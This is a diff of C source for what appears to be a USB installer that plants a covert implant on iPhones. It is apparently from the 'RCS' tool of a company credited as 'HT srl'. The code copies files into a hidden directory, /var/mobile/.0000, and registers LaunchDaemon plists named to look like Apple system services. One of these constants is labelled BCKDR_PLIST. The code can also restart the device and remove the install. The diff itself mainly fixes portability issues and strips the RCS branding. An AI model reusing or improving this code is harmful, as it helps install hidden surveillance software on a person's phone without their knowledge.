@@ -1,14 +1,14 @@
 //
-//  RcsIOSUsbSupport.c
-//  RCSUSBInstaller
+//  iOSUsbSupport.c
+//  iOS USB Installer
 //
-//  Created by armored on 2/7/13.
-//  Copyright (c) 2013 armored. All rights reserved.
+//  Created by Massimo Chiodini on 2/7/13.
+//  Copyright (c) 2013 HT srl. All rights reserved.
 //
 #include "iOSUsbSupport.h"
 #include <errno.h>
 
-#define INSTALLER_DIR         "/var/mobile/.0000"
+#define INSTALLER_DIR         "/private/var/mobile/.0000"
 #define LAUNCHD_INSTALL_PLIST "/Library/LaunchDaemons/com.apple.md0000.plist"
 #define BCKDR_PLIST           "/Library/LaunchDaemons/com.apple.mdworker.plist"
 
@@ -38,6 +38,7 @@ char *plist =
 
 #ifdef WIN32
 
+#define sleep Sleep
 #define EXPORT_DLL __declspec(dllexport)
 
 EXPORT_DLL char *get_model();
@@ -101,28 +102,25 @@ afc_client_t open_device()
 }
 
 void close_device(afc_client_t afc)
-{
-//  lockdownd_client_free(client);
-  
+{ 
   if (afc != NULL)
     afc_client_free(afc);
-  
-//  idevice_free(phone);
-//  phone = NULL;
-//  client = NULL;
 }
 
 int isDeviceAttached()
 {
-  afc_client_t afc = open_device();
+  idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;
+  idevice_t phone = NULL;
   
-  if (afc == NULL)
-    return 0;
-  else
+  ret = idevice_new(&phone, NULL);
+  
+  if (ret == IDEVICE_E_SUCCESS)
   {
-    close_device(afc);
+    idevice_free(phone);
     return 1;
   }
+  else
+    return 0;
 }
 
 #pragma mark -
@@ -292,7 +290,7 @@ idevice_error_t make_install_directory()
 
 idevice_error_t copy_local_file(afc_client_t afc, char *lpath, char* lsrc)
 {
-  uint64_t handle;
+  uint64_t handle = 0;
   char srcpath[256];
   char dstpath[256];
   struct stat filestat;
@@ -311,12 +309,19 @@ idevice_error_t copy_local_file(afc_client_t afc, char *lpath, char* lsrc)
   
   char *filebuff = (char*)malloc(filelen);
   
-  int fd = open(srcpath, O_RDONLY, 0);
+#ifdef WIN32
+  int fd = open(srcpath, O_RDONLY|O_BINARY, 0);
+#else
+   int fd = open(srcpath, O_RDONLY, 0);
+#endif
   
   if (fd == -1)
     return ret;
+
+  int bread = 0;
   
-  int bread = read(fd, filebuff, filelen);
+  while (bread < filelen)
+    bread += read(fd, filebuff+bread, (filelen-bread));
   
   if (bread != filelen)
   {
@@ -452,7 +457,7 @@ char** list_dir_content(char *dir_name)
     if (!entry)
       break;
     
-    if (i < 256 && (strcmp(entry->d_name, "..") && strcmp(entry->d_name, ".")))
+    if (i < 256 && (strcmp(entry->d_name, "..") && strcmp(entry->d_name, ".") && strcmp(entry->d_name, "(null)")))
     {
 #ifdef WIN32
       char *path = (char*)malloc(256);
@@ -530,10 +535,15 @@ int restart_device()
     
     if (ret == DIAGNOSTICS_RELAY_E_SUCCESS)
     {
-      if (diagnostics_relay_restart(diagnostics_client, 0) == DIAGNOSTICS_RELAY_E_SUCCESS)
+      if (diagnostics_relay_restart(diagnostics_client, DIAGNOSTICS_RELAY_ACTION_FLAG_WAIT_FOR_DISCONNECT |
+                                                        DIAGNOSTICS_RELAY_ACTION_FLAG_DISPLAY_PASS) == DIAGNOSTICS_RELAY_E_SUCCESS)
         retVal = 1;
       
+      
       diagnostics_relay_goodbye(diagnostics_client);
+      
+      sleep(5);
+      
       diagnostics_relay_client_free(diagnostics_client);
     }
   }
@@ -551,9 +561,11 @@ int restart_device()
 
 void remove_directory(afc_client_t afc, char *rpath)
 {
-  char **file_list;
+  char **file_list = NULL;
   
-  if (afc_read_directory(afc, rpath, &file_list) == AFC_E_SUCCESS)
+  int retval = afc_read_directory(afc, rpath, &file_list);
+  
+  if ( retval == AFC_E_SUCCESS)
   {
     int i = 0;
     
@@ -574,7 +586,7 @@ int try_remove_installdir(afc_client_t afc)
 {
   int i = 1;
   int ret = 1;
-  uint64_t handle;
+  uint64_t handle = 0;
   
   while (i++)
   {
@@ -644,26 +656,24 @@ int check_running(int timeout)
 
 int remove_installation()
 {
+  int retVal = 0;
+  
   afc_client_t afc = open_device();
   
   if (afc == NULL)
-    return 0;
+    return retVal;
+  
+  if (remove_launchd_plist(afc) == 1)
+    retVal = 1;
   
   if (try_remove_installdir(afc) == 0)
-  {
-    close_device(afc);
-    return 1;
-  }
-  
-  if (remove_launchd_plist(afc) == 0)
-  {
-    close_device(afc);
-    return 1;
-  }
-  
+    retVal = 0;
+  else
+    retVal = 1;
+   
   close_device(afc);
   
-  return 1;
+  return retVal;
 }
 
 int check_installation(int sec, int timeout)
